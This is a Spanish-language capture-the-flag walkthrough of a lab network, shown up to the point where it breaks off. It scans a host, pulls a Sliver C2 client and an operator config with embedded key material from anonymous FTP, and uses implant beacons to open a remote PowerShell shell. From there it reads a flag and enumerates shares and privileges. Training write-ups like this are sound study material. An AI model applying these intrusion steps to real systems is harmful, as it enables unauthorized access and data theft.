

Contexto: En esta mini pro lab se simula un atacke donde tendremos que comprometer 3 maquinas en la red empresarial llamada puppet inc. 

La red ha sido previamente comprometida por phising a la maquina de acceso inicial donde tenia una conexion a un command and control , en este caso para simular la maquina de acceso inicial tiene un Servidor C2 ya comprometido al que nosotros deberemos acceder para comenzar a comprometer la red 

Imagen representativa de la red :

<img width="986" height="479" alt="imagen" src="https://github.com/user-attachments/assets/d33c337b-9b8c-48e2-b04d-ff080260a634" />



Reconocimiento , Acceso inicial y conexion al Command and Control:

``` bash

   client   git:(master)   nmap -p 21,22,8140,8443,8888,31337 -T4 -sV 10.13.38.33
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-06 23:40 +0100
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 40.00% done; ETC: 23:40 (0:00:09 remaining)
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 60.00% done; ETC: 23:40 (0:00:07 remaining)
Nmap scan report for 10.13.38.33
Host is up (0.035s latency).

PORT      STATE  SERVICE        VERSION
21/tcp    open   ftp            vsftpd 3.0.5
22/tcp    open   ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
8140/tcp  open   ssl/http       WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07); OpenSSL 3.0.2)
8443/tcp  open   ssl/https-alt?
8888/tcp  closed sun-answerbook
31337/tcp open   ssl/Elite?
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

El servidor FTP accepta conexion como anonymous sin contraseña y dentro tiene los archivos para poder conectarse al Command and control:

``` bash

   client   git:(master)  curl ftp://10.13.38.33/ --user anonymous:
-rw----r--    1 0        0            2119 Oct 11  2024 red_127.0.0.1.cfg
-rwxr-xr-x    1 0        0        36515304 Oct 12  2024 sliver-client_linux

```

Lo descargamos:

``` bash

   programas curl -O ftp://10.13.38.33/red_127.0.0.1.cfg --user anonymous:
curl -O ftp://10.13.38.33/sliver-client_linux --user anonymous:
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   2119 100   2119   0      0   5343      0                              0
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
  0      0   0      0   0      0      0      0                              0
curl: (56) Recv failure: Connection reset by peer
   programas ls
red_127.0.0.1.cfg  sliver  sliver-client_linux
   programas

``` bash

❯ curl -O ftp://10.13.38.33/sliver-client_linux --user anonymous
Enter host password for user 'anonymous':
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100 34.82M 100 34.82M   0      0  8.95M      0   00:03   00:03          9.26M

```


``` bash

❯ cat red_127.0.0.1.cfg
{"operator":"red","token":"REDACTED","lhost":"10.13.38.33","lport":31337,"ca_certificate":"-----BEGIN CERTIFICATE-----\nMIICJjCCAYegAwIBAgIRALAbBDS3DFS4TF3CSDVSdsdgfsggLmSMwCgYIKoZIzj0EAwQwFDES\nMBAGA1UEAxMJb3BlcmF0b3JzMB4XDTIzMTIyMjEyMjQ1OVoXDTI2MTIyMTEyMjQ1\nOVowFDESMBAGA1UEAxMJb3BlcmF0b3JzMIGbMBAGByqGSM49AgEGBSuBBAAjA4GG\nAAQAvedDJyjbi1l9OzQvw2IOAx8RVwsjUr+YVDuJ1cG3Hcpt//uSXlCp6/BnsArr\n4V8a59m6MRLg5M6+CEoJWnYTAQ4BmQn6/izlEWpcSUv6VGhNlZRG8P3MpbN2M0cV\nprZ5SFL3SAcXmQWENES/DhkNMT8sf4IwgTM+RA95YXXXwvY9Z/CjdzB1MA4GA1Ud\nDwEB/wQEAwICpDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwDwYDVR0T\nAQH/BAUwAwEB/zAdBgNVHQ4EFgQUd7jHTZN0eWYzJ8Nt/va/fHFc1zgwFAYDVR0R\nBA0wC4IJb3BlcmF0b3JzMAoGCCqGSM49BAMEA4GMADCBiAJCARgKKjMFUmd8+tkR\nAJUH30ZpBuSHcDMPYsDaSstgVva1jzn9sI9Dlg5dpRU+8LaK2FXsXUCdlLaYrzIv\np7anvR5CAkIBmk//V/6OV0e1YQcAtg6vL1dBTWPPk6YpLJEicwm6q5DGWMNNHTd8\nhtyfLIKpSsaVXHJjH7kqIbmbuY86TpQo6X0=\n-----END CERTIFICATE-----\n","private_key":"-----BEGIN EC PRIVATE KEY-----\nMIHcAgEBBEIB/vSoY+G1wyjB1xfYo+LpZ9ov7hkQOePJrmq0rznSa/HPRraYjwLZ\nVfdssdf3rvcvñlgdk8QBYAgOgBwYFK4EEACOhgYkDgYYABACp3pUH\nvLKFjb3z/0/IhcHjgfoSKsXCoLuzprckfJfBmI03DP+2uKNqi6V5bpZkzfWWfYDh\nmjXjfY/nPR3lGVL4fwE5ftQMmGffEUaSlZ/MyEQQwZo/oUs6OiTdw0S4aa141bDG\n54CXsdaceGN98H9V1Yrv27S4jFH1D3VEUrCJbkrU5Q==\n-----END EC PRIVATE KEY-----\n","certificate":"-----BEGIN CERTIFICATE-----\nMIIB7zCCAVGgAwIBAgIQL7uHbxTos3ke9pRfj7CXwDAKBggqhkjOPQQDBDAUMRIw\nEAYDVQQDEwlvcGVyYXRvcnMwHhcNMjQwMTMwMTIzMjIyWhcNMjcwMTI5MTIzMjIy\nWjAOMQwwCgYDVQQDEwNyZWQwgZswEAYHKoZIzj0CAQYFK4EEACMDgYYABACp3pUH\nvLKFjb3z/0/IhcHjgfoSKsXCoLuzprckfJfBmI03DP+2uKNqi6V5bpZkzfWWfYDh\nmjXjfY/nPR3lGVL4fwE5ftQMmGffEUaSlZ/MyEQQwZo/oUs6OiTdw0S4aa141bDG\n54CXsdaceGN98H9V1Yrv27S4jFH1D3VEUrCJbkrU5aNIMEYwDgYDVR0PAQH/BAQD\nAgWgMBMGA1UdJQQMMAoGCCsGAQUFBwMCMB8GA1UdIwQYMBaAFHe4x02TdHlmMyfD\nbf72v3xxXNc4MAoGCCqGSM49BAMEA4GLADCBhwJCAQrEErqmcDVO22Ze6caAd5+F\n4nrwq/o1NC1nNODRspipprdjB4/vQMt98PiA2cO9Ayql33rHBNky4IweHdieD4Ws\nAkFQEbWoqRsVhxGAcqmdLI76PyazW1pMi5Rge0UMLQ4mxB4lQ+yKS9qu5pWx3WKz\nsXraOydUfKNpOYdscD/i2TX7fg==\n-----END CERTIFICATE-----\n"}%                                      ╭─ ~/hacking/ctf/htb/pro-lab/puppet                                                                                ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ ./sliver-client_linux
Connecting to 10.13.38.33:31337 ...

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain reinforce
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

```

``` bash

sliver > beacons

 ID         Name             Transport   Hostname   Username             Operating System   Last Check-In   Next Check-In
========== ================ =========== ========== ==================== ================== =============== ===============
 ca4c9b16   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      58s             24s         
 ee9564cd   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      45s             21s         
 1fcef64a   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      57s             29s         
 b097f151   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      33s             49s         
 c395c300   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      31s             51s         

sliver >

```

``` bash

sliver > beacons

 ID         Name             Transport   Hostname   Username             Operating System   Last Check-In   Next Check-In
========== ================ =========== ========== ==================== ================== =============== ===============
 ca4c9b16   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      1m10s           1m10s       
 ee9564cd   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      6s              1m4s        
 1fcef64a   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      11s             49s         
 b097f151   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      52s             28s         
 c395c300   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      1m9s            11s         

sliver > use c395c300

[*] Active beacon BLUSHING_ERROR (c395c300-68fa-42b2-927a-875c36d083ec)

sliver (BLUSHING_ERROR) > whoami

Logon ID: PUPPET\bruce.smith
[*] Tasked beacon BLUSHING_ERROR (3202d874)

[*] Session ddcf3631 BLUSHING_ERROR - 172.16.40.50:49767 (File01) - windows/amd64 - Sun, 12 Jul 2026 04:27:37 CEST

[+] BLUSHING_ERROR completed task 3202d874


sliver (BLUSHING_ERROR) >

```

``` bash

sliver >
sliver > sessions

 ID         Transport   Remote Address       Hostname   Username             Operating System   Health
========== =========== ==================== ========== ==================== ================== =========
 433a7924   mtls        172.16.40.50:49780   File01     PUPPET\bruce.smith   windows/amd64      [ALIVE]
 ddcf3631   mtls        172.16.40.50:49767   File01     PUPPET\bruce.smith   windows/amd64      [ALIVE]

sliver > use 433a7924

[*] Active session BLUSHING_ERROR (433a7924-5ce6-4826-907c-486e44e72609)

sliver (BLUSHING_ERROR) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 3284

PS C:\Windows\system32> whoami
whoami
puppet\bruce.smith
PS C:\Windows\system32>

```

``` bash

PS C:\Windows\system32> ls C:\Users\bruce.smith\Desktop
ls C:\Users\bruce.smith\Desktop


    Directory: C:\Users\bruce.smith\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/22/2025  11:44 PM             40 flag.txt
-a----        10/11/2024   7:07 AM           2312 Microsoft Edge.lnk


PS C:\Windows\system32> type C:\Users\bruce.smith\Desktop\flag.txt
type C:\Users\bruce.smith\Desktop\flag.txt
PUPPET{REDACTED}
PS C:\Windows\system32>

```

``` windows

PS C:\Users> pwd
pwd

Path
----
C:\Users


PS C:\Users> dir
dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/25/2024  10:23 PM                Administrator
d-----        10/11/2024   7:12 AM                Administrator.PUPPET
d-----        10/11/2024   7:07 AM                bruce.smith
d-r---         9/25/2024  10:23 PM                Public
d-----        10/11/2024   6:30 AM                svc_inventory_win


PS C:\Users>

``` 


``` cmd
PS C:\Users> Get-SmbShare
Get-SmbShare

Name   ScopeName Path       Description
----   --------- ----       -----------
ADMIN$ *         C:\Windows Remote Admin
C$     *         C:\        Default share
files  *         C:\files   company files
IPC$   *                    Remote IPC


PS C:\Users>

```

``` cmd

PS C:\Users> cd \\172.16.40.50\files
cd \\172.16.40.50\files
PS Microsoft.PowerShell.Core\FileSystem::\\172.16.40.50\files>
PS Microsoft.PowerShell.Core\FileSystem::\\172.16.40.50\files> dir
dir


    Directory: \\172.16.40.50\files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/12/2024   1:26 AM                HR
d-----        10/12/2024   1:50 AM                IT
d-----        10/12/2024   1:26 AM                ITSEC
d-----        10/12/2024   1:26 AM                MGMT
d-----        10/12/2024   1:26 AM                Transfer

```

``` powershell

PS Microsoft.PowerShell.Core\FileSystem::\\172.16.40.50\files> cd IT
cd IT
PS Microsoft.PowerShell.Core\FileSystem::\\172.16.40.50\files\IT> dir
dir


    Directory: \\172.16.40.50\files\IT


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/11/2024   5:52 AM       32794112 puppet-agent-x64-latest.msi


PS Microsoft.PowerShell.Core\FileSystem::\\172.16.40.50\files\IT>

```

```

PS Microsoft.PowerShell.Core\FileSystem::\\172.16.40.50\files\IT> whoami /all
whoami /all

USER INFORMATION
----------------

User Name          SID
================== ==============================================
puppet\bruce.smith S-1-5-21-3066630505-2324057459-3046381011-1126


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes   
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
PUPPET\employees                           Group            S-1-5-21-3066630505-2324057459-3046381011-1105 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                 


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
PS Microsoft.PowerShell.Core\FileSystem::\\172.16.40.50\files\IT>

```

